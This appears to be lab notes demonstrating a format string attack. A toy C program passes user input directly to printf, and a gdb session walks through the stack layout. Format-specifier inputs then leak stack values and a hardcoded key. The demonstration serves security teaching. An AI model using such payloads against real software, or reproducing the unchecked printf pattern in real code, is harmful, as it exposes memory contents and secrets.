Format String Attack
----------------------------------------------------------------

  4 void print(char *s_ptr)
  5 {
  6     int i = 0xaabbccdd;
  7 
  8     printf(s_ptr);
  9 }
 10 
 11 
 12 int main(int argc, char **argv)
 13 {
 14     char *key = "X8GX-6S5V-MOI0-PL5F";
 15 
 16     print(argv[1]);
 17 
 18     return 0;
 19 }


1. Simple string 
----------------------------------------------------------------

$ gdb ./fmt_string

(gdb) break 16
Breakpoint 1 at 0x8048457: file fmt_string.c, line 16.

(gdb) disass print
Dump of assembler code for function print:
   0x08048430 <+0>:     push   ebp
   0x08048431 <+1>:     mov    ebp,esp
   0x08048433 <+3>:     sub    esp,0x8
   0x08048436 <+6>:     mov    DWORD PTR [ebp-0x4],0xaabbccdd
   0x0804843d <+13>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048440 <+16>:    mov    DWORD PTR [esp],eax
   0x08048443 <+19>:    call   0x80482f0 <printf@plt>
   0x08048448 <+24>:    leave  
   0x08048449 <+25>:    ret    

(gdb) break *0x08048443
Breakpoint 2 at 0x8048443: file fmt_string.c, line 8.

(gdb) run hello
Breakpoint 1, main (argc=2, argv=0xbfffefb4) at fmt_string.c:16

(gdb) disass 
Dump of assembler code for function main:
   0x0804844a <+0>: push   ebp
   0x0804844b <+1>: mov    ebp,esp
   0x0804844d <+3>: sub    esp,0x8
   0x08048450 <+6>: mov    DWORD PTR [ebp-0x4],0x8048504
=> 0x08048457 <+13>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804845a <+16>:    add    eax,0x4
   0x0804845d <+19>:    mov    eax,DWORD PTR [eax]
   0x0804845f <+21>:    mov    DWORD PTR [esp],eax
   0x08048462 <+24>:    call   0x8048430 <print>
   0x08048467 <+29>:    mov    eax,0x0
   0x0804846c <+34>:    leave  
   0x0804846d <+35>:    ret  

(gdb) x/8xw $esp
0xbfffef10: 0x08048470  0x08048504  0x00000000  0x46cbe963
0xbfffef20: 0x00000002  0xbfffefb4  0xbfffefc0  0xb7ffe6b0

(gdb) c
Breakpoint 2, 0x08048443 in print (s_ptr=0xbffff1a0 "hello") at fmt_string.c:8

(gdb) disass
Dump of assembler code for function print:
   0x08048430 <+0>: push   ebp
   0x08048431 <+1>: mov    ebp,esp
   0x08048433 <+3>: sub    esp,0x8
   0x08048436 <+6>: mov    DWORD PTR [ebp-0x4],0xaabbccdd
   0x0804843d <+13>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048440 <+16>:    mov    DWORD PTR [esp],eax
=> 0x08048443 <+19>:    call   0x80482f0 <printf@plt>
   0x08048448 <+24>:    leave  
   0x08048449 <+25>:    ret    

(gdb) x/32xw $esp
0xbfffef00: 0xbffff1a0  0xaabbccdd  0xbfffef18  0x08048467
0xbfffef10: 0xbffff1a0  0x08048504  0x00000000  0x46cbe963
0xbfffef20: 0x00000002  0xbfffefb4  0xbfffefc0  0xb7ffe6b0
0xbfffef30: 0x00000001  0x00000001  0x00000000  0x0804a014
0xbfffef40: 0x0804821c  0x46e5e000  0x00000000  0x00000000
0xbfffef50: 0x00000000  0x5c31cbda  0x343dce28  0x00000000
0xbfffef60: 0x00000000  0x00000000  0x00000002  0x08048320
0xbfffef70: 0x00000000  0x46c96f10  0x46cbe879  0x46ca1fd4

(gdb) stepi
0x080482f0 in printf@plt ()

(gdb) disass
Dump of assembler code for function printf@plt:
=> 0x080482f0 <+0>: jmp    DWORD PTR ds:0x804a00c
   0x080482f6 <+6>: push   0x0
   0x080482fb <+11>:    jmp    0x80482e0

(gdb) x/32xw $esp
0xbfffeefc: 0x08048448  0xbffff1a0  0xaabbccdd  0xbfffef18
0xbfffef0c: 0x08048467  0xbffff1a0  0x08048504  0x00000000
0xbfffef1c: 0x46cbe963  0x00000002  0xbfffefb4  0xbfffefc0
0xbfffef2c: 0xb7ffe6b0  0x00000001  0x00000001  0x00000000
0xbfffef3c: 0x0804a014  0x0804821c  0x46e5e000  0x00000000
0xbfffef4c: 0x00000000  0x00000000  0x5c31cbda  0x343dce28
0xbfffef5c: 0x00000000  0x00000000  0x00000000  0x00000002
0xbfffef6c: 0x08048320  0x00000000  0x46c96f10  0x46cbe879

(gdb) x/1s 0xbffff1a0
0xbffff1a0: "hello"


2. Format String Attack
----------------------------------------------------------------

$ ./fmt_string "hello %08x"
hello aabbccdd

$ ./fmt_string "hello %08x %08x %08x %s %s"
hello aabbccdd bfffef58 08048467 hello %08x %08x %08x %s %s X8GX-6S5V-MOI0-PL5F 

